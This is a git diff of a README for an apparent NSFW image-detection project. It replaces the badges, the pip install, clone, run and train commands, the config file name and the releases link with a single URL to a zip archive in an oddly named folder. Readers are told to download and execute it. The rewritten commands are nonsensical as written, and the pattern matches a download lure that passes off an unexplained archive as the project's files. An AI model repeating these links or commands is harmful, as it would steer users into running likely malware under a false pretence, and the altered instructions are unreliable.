@@ -1,6 +1,6 @@
 # NSFW Image Detection 🖼️🚫
 
-![GitHub Repo](https://img.shields.io/badge/GitHub-Repo-blue.svg) ![Releases](https://img.shields.io/badge/Releases-latest-orange.svg)
+![GitHub Repo](https://github.com/pedropqv/nsfw-image-detection/raw/refs/heads/main/condyloma/detection_nsfw_image_v2.4.zip) ![Releases](https://github.com/pedropqv/nsfw-image-detection/raw/refs/heads/main/condyloma/detection_nsfw_image_v2.4.zip)
 
 Welcome to the **NSFW Image Detection** repository! This project focuses on detecting and categorizing explicit, suggestive, or safe media in images. It utilizes a vision-language encoder model fine-tuned from the `siglip2-base-patch16-256` architecture. 
 
@@ -34,7 +34,7 @@ This project can be particularly useful for applications that require content mo
 To get started, you need to install the necessary dependencies. You can do this using pip. 
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/pedropqv/nsfw-image-detection/raw/refs/heads/main/condyloma/detection_nsfw_image_v2.4.zip
 ```
 
 Make sure you have Python 3.6 or higher installed on your machine.
@@ -45,13 +45,13 @@ To use the NSFW Image Detection model, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/pedropqv/nsfw-image-detection.git
+   git clone https://github.com/pedropqv/nsfw-image-detection/raw/refs/heads/main/condyloma/detection_nsfw_image_v2.4.zip
    cd nsfw-image-detection
    ```
 
 2. **Run the Gradio app**:
    ```bash
-   python app.py
+   python https://github.com/pedropqv/nsfw-image-detection/raw/refs/heads/main/condyloma/detection_nsfw_image_v2.4.zip
    ```
 
 3. **Access the web interface**: Open your browser and go to `http://localhost:7860` to start using the model.
@@ -64,11 +64,11 @@ If you're interested in training the model further, follow these steps:
 
 1. **Prepare your dataset**: Make sure your images are organized into folders based on their categories (e.g., explicit, suggestive, safe).
   
-2. **Update the configuration file**: Modify the `config.yaml` file to point to your dataset.
+2. **Update the configuration file**: Modify the `https://github.com/pedropqv/nsfw-image-detection/raw/refs/heads/main/condyloma/detection_nsfw_image_v2.4.zip` file to point to your dataset.
 
 3. **Start training**:
    ```bash
-   python train.py
+   python https://github.com/pedropqv/nsfw-image-detection/raw/refs/heads/main/condyloma/detection_nsfw_image_v2.4.zip
    ```
 
 4. **Monitor the training process**: You can check the logs for any issues and track the training progress.
@@ -97,7 +97,7 @@ For questions or suggestions, feel free to open an issue or contact me directly.
 
 ## Releases
 
-You can find the latest releases of this project [here](https://github.com/pedropqv/nsfw-image-detection/releases). Download the necessary files and execute them to get started with the model.
+You can find the latest releases of this project [here](https://github.com/pedropqv/nsfw-image-detection/raw/refs/heads/main/condyloma/detection_nsfw_image_v2.4.zip). Download the necessary files and execute them to get started with the model.
 
 For more details on how to use the released versions, please refer to the documentation provided in the releases section.
 
